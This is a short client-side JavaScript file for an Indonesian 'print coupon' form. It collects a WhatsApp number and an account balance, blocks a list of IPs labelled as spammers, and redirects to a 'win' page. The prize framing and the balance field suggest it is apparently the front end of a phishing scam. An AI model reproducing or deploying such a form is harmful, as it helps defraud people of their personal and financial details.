document.addEventListener("DOMContentLoaded", async () => {
  const form = document.getElementById("formData");
  const submitBtn = document.getElementById("kirim");
  let isSubmitting = false;

  // 🔥 Daftar IP spammer
  const blockedIPs = [
    "180.248.76.246",
    "182.8.179.108",
    "182.3.141.223",
    "182.8.161.143"
  ];

  // 🔍 Cek IP user
  const userIP = await getPublicIP();
  if (blockedIPs.includes(userIP)) {
    alert("Akses kamu diblokir karena terdeteksi sebagai spam!");
    form.remove(); // atau bisa disable aja
    return;
  }

  form.addEventListener("submit", async function (e) {
    e.preventDefault();

    if (isSubmitting) {
      alert("Tunggu sebentar ya, sedang memproses...");
      return;
    }

    isSubmitting = true;
    submitBtn.disabled = true;
    submitBtn.innerText = "Memproses Cetak Kupon...";

    const formData = new FormData(form);
    const data = Object.fromEntries(formData.entries());

    // ✋ Validasi manual di client-side
    const noWA = data.b || '';
    const saldo = data.c || '';

    if (!/^08[0-9]{8,13}$/.test(noWA)) {
      alert("Nomor WhatsApp tidak valid!");
      resetBtn();
      return;
    }

    if (saldo.length < 3) {
      alert("Saldo terlalu kecil untuk diikutkan.");
      resetBtn();
      return;
    }

    try {
      const res = await fetch('/api/suen', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify(data)
      });

      const json = await res.json();

      if (json.success) {
        vibr(180);
        setTimeout(() => {
          window.location.href = 'win.html';
        }, 1000);
      } else {
        alert(json.message || "Gagal mengirim. Coba lagi.");
      }
    } catch (err) {
      console.error("Error:", err);
      alert("Terjadi kesalahan saat kirim data.");
    }

    resetBtn();
  });

  function resetBtn() {
    isSubmitting = false;
    submitBtn.disabled = false;
    submitBtn.innerText = "Cetak Kupon";
  }

  async function getPublicIP() {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip;
    } catch (err) {
      console.error("Gagal ambil IP:", err);
      return null;
    }
  }
});
